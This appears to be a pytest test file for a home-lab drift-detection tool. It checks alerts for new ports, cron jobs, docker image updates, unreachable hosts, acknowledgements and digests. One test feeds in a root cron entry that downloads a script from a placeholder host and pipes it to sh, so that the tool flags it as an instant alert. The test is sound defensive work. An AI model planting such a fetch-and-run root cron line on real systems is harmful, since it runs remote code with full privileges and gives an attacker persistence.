import datetime as dt
import json

import pytest

from conftest import raw
from homelab_drift.annotations import Annotations
from homelab_drift.collectors import Ctx, registry
from homelab_drift.engine import CollectResult, Engine, HostResult, digest
from homelab_drift.store import Changelog, State

REG = registry()
NEW_PORT = 'tcp LISTEN 0 4096 0.0.0.0:18999 0.0.0.0:* users:(("docker-proxy",pid=999,fd=8))\n'
LOCAL_PORT = 'tcp LISTEN 0 4096 127.0.0.1:18998 0.0.0.0:* users:(("python3",pid=998,fd=8))\n'


class Rig:
    """Engine with its state in a tmp directory; scan() feeds collector results."""
    def __init__(self, cfg, notes=None):
        self.cfg = cfg
        self.st = State.load(cfg.data_dir)
        self.cl = Changelog(cfg.data_dir)
        self.notes = notes or Annotations({})
        self.ctx = Ctx(cfg, cfg.hosts[0])

    def items(self, col, text):
        return REG[col].parse(text, self.ctx)

    def scan(self, cols: dict | None = None, reachable=True, error=""):
        eng = Engine(self.cfg, self.st, self.cl, self.notes, REG)
        hr = HostResult("pi", reachable, error, {c: (v if isinstance(v, CollectResult) else CollectResult("ok", v))
                                               for c, v in (cols or {}).items()})
        return eng.process([hr])


@pytest.fixture
def rig(cfg):
    return Rig(cfg)


def ports(rig, extra=""):
    return {"ports": rig.items("ports", raw("ports") + extra)}


def test_first_scan_is_inventory_without_findings(rig):
    s = rig.scan(ports(rig))
    assert s.first_inventory == ["pi/ports"] and not s.confirmed
    assert rig.cl.read()[0]["kind"] == "inventory"


def test_new_public_port_confirmed_after_n_scans_and_alerts(rig):
    rig.scan(ports(rig))
    assert not rig.scan(ports(rig, NEW_PORT)).confirmed
    assert not rig.scan(ports(rig, NEW_PORT)).confirmed
    s = rig.scan(ports(rig, NEW_PORT))
    [f] = s.confirmed
    assert f["kind"] == "added" and f["severity"] == "instant" and f["item_id"] == "tcp/18999"
    assert "Port 18999/tcp is new" in f["title"]
    assert len(rig.st.outbox) == 1 and "not documented anywhere" in rig.st.outbox[0]["message"]
    assert "homelab-drift ack D-0001" in rig.st.outbox[0]["message"]
    # baseline adopted: no further finding
    assert not rig.scan(ports(rig, NEW_PORT)).confirmed


def test_flapping_resets_counter(rig):
    rig.scan(ports(rig))
    rig.scan(ports(rig, NEW_PORT))
    rig.scan(ports(rig, NEW_PORT))
    rig.scan(ports(rig))            # short restart / gone -> counting starts over
    rig.scan(ports(rig, NEW_PORT))
    assert not rig.scan(ports(rig, NEW_PORT)).confirmed
    assert rig.scan(ports(rig, NEW_PORT)).confirmed


def test_local_port_is_digest_only(rig):
    rig.scan(ports(rig))
    for _ in range(3):
        s = rig.scan(ports(rig, LOCAL_PORT))
    assert s.confirmed[0]["severity"] == "digest" and not rig.st.outbox


def test_documented_port_is_digest(cfg):
    r = Rig(cfg, Annotations({"pi": {"ports": {"tcp/18999": "Test service XY"}}}))
    r.scan(ports(r))
    for _ in range(3):
        s = r.scan(ports(r, NEW_PORT))
    f = s.confirmed[0]
    assert f["severity"] == "digest" and f["documented"] and f["status"] == "open" and not r.st.outbox


def test_yaml_known_acknowledges_without_alert(cfg):
    r = Rig(cfg, Annotations({"pi": {"ports": {"tcp/18999": {"note": "Test", "known": True, "reason": "acceptance"}}}}))
    r.scan(ports(r))
    for _ in range(3):
        s = r.scan(ports(r, NEW_PORT))
    f = s.confirmed[0]
    assert f["status"] == "acknowledged" and f["ack"]["via"] == "annotations.yaml" and not r.st.outbox


def test_yaml_ack_expires(cfg):
    yesterday = dt.date.today() - dt.timedelta(days=1)
    r = Rig(cfg, Annotations({"pi": {"ports": {"tcp/18999": {"known": True, "until": yesterday}}}}))
    r.scan(ports(r))
    for _ in range(3):
        s = r.scan(ports(r, NEW_PORT))
    assert s.confirmed[0]["status"] == "open"


def test_yaml_ack_applies_to_existing_finding_and_wildcards(rig):
    rig.scan(ports(rig))
    for _ in range(3):
        rig.scan(ports(rig, NEW_PORT))
    assert rig.st.open_findings()
    rig.notes = Annotations({"all": {"ports": {"tcp/189*": {"known": True}}}})
    rig.scan(ports(rig, NEW_PORT))
    assert not rig.st.open_findings() and rig.st.findings[0]["status"] == "acknowledged"


def test_removed_and_back_to_original_closes(rig):
    rig.scan(ports(rig, NEW_PORT))  # initial inventory with the port
    for _ in range(3):
        s = rig.scan(ports(rig))
    [f] = s.confirmed
    assert f["kind"] == "removed" and f["severity"] == "digest" and "is gone" in f["title"]
    for _ in range(3):
        s = rig.scan(ports(rig, NEW_PORT))
    assert not s.confirmed  # back to the original state -> no new finding
    assert rig.st.findings[0]["status"] == "closed"
    assert rig.cl.read()[0]["kind"] == "reverted"


def test_acknowledged_addition_then_removal_is_reported(rig):
    rig.scan(ports(rig))
    for _ in range(3):
        rig.scan(ports(rig, NEW_PORT))
    rig.st.ack(rig.st.findings[0], via="cli", reason="test")
    for _ in range(3):
        s = rig.scan(ports(rig))
    [f] = s.confirmed
    assert f["kind"] == "removed" and f["status"] == "open"
    assert rig.st.findings[0]["status"] == "closed" and "superseded" in rig.st.findings[0]["closed_reason"]


def test_docker_image_update_message(rig):
    items = rig.items("docker", raw("docker"))
    rig.scan({"docker": items})
    upd = json.loads(json.dumps(items))
    ha = next(i for i in upd if i["id"] == "homeassistant")
    old_version = ha["version"]
    ha.update(image_id="0123456789ab", version="2026.12.0")
    for _ in range(3):
        s = rig.scan({"docker": upd})
    [f] = s.confirmed
    assert f["title"] == f"Image of homeassistant updated ({old_version} → 2026.12.0)"
    assert f["severity"] == "digest"


def test_new_root_cron_is_instant(rig):
    rig.scan({"cron": rig.items("cron", raw("cron"))})
    extra = raw("cron") + "### FILE /etc/cron.d/new\n*/2 * * * * root curl -s http://example.invalid | sh\n"
    for _ in range(3):
        s = rig.scan({"cron": rig.items("cron", extra)})
    [f] = s.confirmed
    assert f["severity"] == "instant" and "running as root" in f["title"]


def test_new_user_cron_is_digest(rig):
    rig.scan({"cron": rig.items("cron", raw("cron"))})
    extra = raw("cron") + "### USER pi\n0 3 * * * /home/pi/backup.sh\n"
    for _ in range(3):
        s = rig.scan({"cron": rig.items("cron", extra)})
    assert s.confirmed[0]["severity"] == "digest"


def test_info_fields_do_not_cause_drift(rig):
    st = rig.items("storage", raw("storage"))
    rig.scan({"storage": st})
    st2 = json.loads(json.dumps(st))
    st2[0]["used"] += 10**9
    st2[0]["use_percent"] += 1
    for _ in range(4):
        assert not rig.scan({"storage": st2}).confirmed
    assert rig.st.baseline["pi"]["storage"]["/"]["used"] == st2[0]["used"]  # info kept current


def test_unreachable_host_alerts_after_threshold_and_recovers(rig):
    rig.scan(ports(rig))
    s = rig.scan(reachable=False, error="Connection refused")
    assert not s.confirmed and s.health_problems
    s = rig.scan(reachable=False, error="Connection refused")
    [f] = s.confirmed
    assert f["kind"] == "health" and f["severity"] == "instant" and "unreachable" in f["title"]
    assert rig.st.outbox[-1]["title"] == "Homelab-Drift: pi"
    rig.scan(ports(rig))
    assert f["status"] == "closed" and rig.st.outbox[-1]["title"] == "Resolved: pi"


def test_collector_error_and_empty_result(rig):
    rig.scan(ports(rig))
    for _ in range(2):
        s = rig.scan({"ports": CollectResult("error", error="exit 1: broken")})
    assert s.confirmed[0]["title"] == "Collector ports on pi failed"
    rig.scan(ports(rig))  # healthy again -> closed
    assert not [f for f in rig.st.open_findings() if f["kind"] == "health"]
    for _ in range(2):
        s = rig.scan({"ports": CollectResult("ok", [])})
    assert "suddenly returns nothing" in s.confirmed[0]["title"]
    # an empty list must not wipe the baseline
    assert len(rig.st.baseline["pi"]["ports"]) > 10


def test_empty_accepted_after_ack(rig):
    rig.scan({"cron": rig.items("cron", raw("cron"))})
    for _ in range(2):
        rig.scan({"cron": CollectResult("ok", [])})
    hf = rig.st.open_findings()[0]
    rig.st.ack(hf, via="cli")
    for _ in range(3):
        s = rig.scan({"cron": CollectResult("ok", [])})
    assert s.changes > 5 and not rig.st.baseline["pi"]["cron"]


def test_scan_gap_reports(rig):
    rig.scan(ports(rig))
    rig.st.meta["last_scan"] = (dt.datetime.now().astimezone() - dt.timedelta(hours=5)).isoformat()
    rig.scan(ports(rig))
    assert rig.st.outbox[-1]["title"] == "Homelab-Drift is running again"


def test_digest_lists_new_and_reminds_old(rig, cfg):
    rig.scan(ports(rig, NEW_PORT))
    for _ in range(3):
        rig.scan(ports(rig))
    title, msg = digest(cfg, rig.st)
    assert "1 new finding" in title and "Port 18999/tcp is gone (for" in msg
    title, msg = digest(cfg, rig.st)
    assert "no new findings" in title and "1 older open" in msg
    rig.st.findings[0]["status"] = "acknowledged"
    assert digest(cfg, rig.st) is None


def test_state_roundtrip(rig, cfg):
    rig.scan(ports(rig))
    rig.st.save()
    st2 = State.load(cfg.data_dir)
    assert st2.baseline == rig.st.baseline and st2.meta["scans"] == 1


def test_corrupt_state_is_moved_aside(cfg):
    cfg.data_dir.mkdir(parents=True)
    (cfg.data_dir / "state.json").write_text("{broken", encoding="utf-8")
    st = State.load(cfg.data_dir)
    assert st.baseline == {} and list(cfg.data_dir.glob("state.json.corrupt-*"))


def test_chain_new_stopped_running_removed_cancels_out(rig):
    """added -> stopped -> running again -> gone: back where it started (did not exist) -> no open finding."""
    items = rig.items("docker", raw("docker"))
    rig.scan({"docker": items})
    extra = json.loads(json.dumps(items[0]))
    extra["id"] = "test-host"
    def n(x): return [*items, x]
    for _ in range(3):
        rig.scan({"docker": n(extra)})
    stopped = {**extra, "running": False}
    for _ in range(3):
        rig.scan({"docker": n(stopped)})
    for _ in range(3):
        rig.scan({"docker": n(extra)})
    for _ in range(3):
        s = rig.scan({"docker": items})
    assert not s.confirmed and not rig.st.open_findings()


def test_upgrade_with_new_compare_field_is_silent(rig):
    items = rig.items("systemd", raw("systemd"))
    old = [{k: v for k, v in i.items() if k != "run_state"} for i in items]  # baseline of an older version
    rig.scan({"systemd": old})
    for _ in range(3):
        s = rig.scan({"systemd": items})
    assert not s.confirmed and not rig.st.pending
